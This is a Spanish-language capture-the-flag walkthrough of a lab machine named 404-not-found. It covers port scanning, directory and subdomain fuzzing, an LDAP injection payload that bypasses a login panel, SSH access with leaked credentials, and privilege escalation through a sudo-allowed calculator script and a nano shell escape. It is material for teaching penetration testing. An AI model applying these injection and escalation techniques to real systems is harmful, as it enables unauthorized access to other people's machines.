# Enumeracion de Puertos, Servicios y Versiones22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58revisamos el servicio web, pero no podemos conectarnos, la url del navegador marca: http://404-not-found.hl/asi que agregamos el dominio al archivo /etc/host. revisamos la web y tras clickar sobre participar ahoranos conseguimos los siguientes desafios:----------------------------------------------------------Para iniciar, por favor resuelve esta sencilla ecuación:5 + 7 * 2 - (4 / 2) = ?R= 17----------------------------------------------------------// Clave secreta (no la compartas):UXVlIGhhY2VzPywgbWlyYSBlbiBsYSBVUkwuesto parece base64, asi que:echo 'UXVlIGhhY2VzPywgbWlyYSBlbiBsYSBVUkwu' |base64 -dQue haces?, mira en la URL.                                                                                                                                                                        ----------------------------------------------------------*** Información Confidencial ***Protocolo de acceso: xyz123----------------------------------------------------------# Fuzzing Web feroxbuster -u http://404-not-found.hl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js,py───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────403      GET        9l       28w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter404      GET        9l       31w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200      GET      127l      304w     3494c http://404-not-found.hl/participar.html200      GET      101l      243w     2784c http://404-not-found.hl/200      GET      101l      243w     2784c http://404-not-found.hl/index.htmlchequeamos codigos fuentes pero nada mas que nos pueda ayudar, asi que tomandole la palabraa al mensaje que decodificamos,lo que se me ocurre es buscar sub-dominioswfuzz -H "Host: FUZZ.404-not-found.hl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://404-not-found.hl --hw 28********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://404-not-found.hl/Total requests: 114441=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                =====================================================================000000097:   200        149 L    152 W      2023 Ch     "info"                                                                                                 000009532:   400        10 L     35 W       299 Ch      "#www"                                                                                                 000010581:   400        10 L     35 W       299 Ch      "#mail"                                                                                                000047706:   400        10 L     35 W       299 Ch      "#smtp"                                                                                                000103135:   400        10 L     35 W       299 Ch      "#pop3" nos conseguimos con "info", asi que lo agregamos al archivo /etc/host y nos conectamos, tras chequear http://info.404-not-found.hl/ nos conseguimos con un panel de login, asi que volvemos hacer fuzzing sobre este sub-dominiogobuster dir -u http://info.404-not-found.hl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,py,js,png,jpg===============================================================/.php                 (Status: 403) [Size: 286]/.html                (Status: 403) [Size: 286]/login.php            (Status: 200) [Size: 29]/index.html           (Status: 200) [Size: 2023]/fail.html            (Status: 200) [Size: 1901]/.html                (Status: 403) [Size: 286]/.php                 (Status: 403) [Size: 286]/server-status        (Status: 403) [Size: 286]Progress: 1661144 / 1661152 (100.00%)===============================================================chequeamos el codigo fuente en http://info.404-not-found.hl/index.html y al final del todo nos conseguimos con:<!-- I believe this login works with LDAP -->traduccion:<!-- Creo que este inicio de sesión funciona con LDAP -->despues de buscar por la web un rato, me consegui con que si un login funciona con ldap y resulta ser vulneraablea una inyeccion ldap (al estilo de una inyeccion sql), podemos burlar la autenticacion  inyeccion: user=*)(uid=*))(|(uid=*pass=passwordasi que nos vamos al panel de login y colocamos username = *)(uid=*))(|(uid=*password = (cualquier cosa)tras esta comprobacion, logramos burlar la verificacion y al acceder nos conseguimos con credenciales:Credenciales de AdminNombre de usuario: 404-pageContraseña: not-found-page-secretintente probar loguearme nuevamente con dichas credenciales y no funciono, asi que intente por ssh y accedimos al sistemassh 404-page@172.17.0.2passwd: not-found-page-secret# Escalada de Privilegiossudo -l    (200-ok : 200-ok) /home/404-page/calculator.pyfind / 2>&1 |grep .txt |grep -v 'Permission'				| buscamos archivos txt en el sistema/var/www/nota.txt							| de todos los resultados, este parece de interescat /var/www/nota.txtIn the calculator I don't know what the symbol is used for "!" followed by something else, only 200-ok knows.traduccion:En la calculadora no sé para qué se usa el símbolo "!" seguido de algo más, sólo 200-ok lo sabe.bueno ya tenemos una pista mas, asi que ejecutamos el scriptsudo -u 200-ok /home/404-page/calculator.pycalculator> !lscalculator.pyejecucion de comandos, primero chequeemos a los usuarios del sistemacat /etc/passwd |grep bashroot:x:0:0:root:/root:/bin/bash404-page:x:1001:1001:404-page,,,:/home/404-page:/bin/bash200-ok:x:1000:1000:200-ok,,,:/home/200-ok:/bin/bashsolo vemos un usuario mas, asi que vamos a revisar su directorio haciendo uso de la calculadorasudo -u 200-ok /home/404-page/calculator.pycalculator> !ls /home/200-ok	boss.txt  user.txt							| conseguimos 2 archivos, ahora los leemoscalculator> !cat /home/200-ok/user.txtbef4bb318a17abd01158337811750bcf					| conseguimos un hashcalculator> !cat /home/200-ok/boss.txtWhat is rooteable							| mensaje traducido: ¿Qué es rooteable?no consegui descifrar el hash, pero como podemos ejecutar cualquier comando desde la calculadora como el usuario 200-okescalaremos ejecutando nanocalculator> !nano /home/200-ok/ll^R^Xreset; sh 1>&0 2>&0clearya somo el usuario 200-oksudo -l					| solicita passwdfind / -perm -4000 2>/dev/null		| nada por aquidespues de un rato revisando procesos y demas no consegui nada asi que intente escalar a rootcon rooteable, la pregunta que hacen en el txt y resulto ser la passwd de rootsu rootpasswd: rooteable